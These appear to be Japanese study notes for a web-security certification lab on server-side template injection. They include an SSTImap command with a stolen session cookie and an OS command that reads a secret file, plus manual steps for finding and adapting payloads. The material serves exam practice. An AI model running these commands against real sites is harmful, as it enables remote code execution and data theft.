### SSTIMap(自動)

[[🔍SSTI#手動]]で検知した場合は悪用できるかビミョー

- エンジンが特定できたら[[🔍SSTI#テンプレートエンジンの特定]]に+で以下を加える
```zsh
--engine Jinja2 \
```
- RCEのexploitを実行する
```zsh
--os-cmd 'cat /home/carlos/secret'
```

- 具体例
```zsh
./sstimap.py -u https://TARGET_NET/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker FUZZ --data 'csrf=ValidCSRFToken&template=FUZZ&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'
```

---
### 手動

1. [詳細なcheatsheet](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)もしくは、[HackTricks: SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)でテンプレートエンジン名を検索する。
	- Cheatsheetに載ってないテンプレートエンジンでも、検索すれば他のWebサイトに書いてあることが多いが試験では考えられない

2. 記載のペイロードでうまくいかなければ、ドキュメントを読んで基本的なシンタックスを理解する。
	- 変数の参照やメソッドの実行方法など

3. 目的のペイロードを適切なシンタックスで実行する
	- エラーメッセージをみてペイロードを適宜変更する
	- 利用可能なオブジェクトを列挙し、そのオブジェクトに変更する必要があるかも
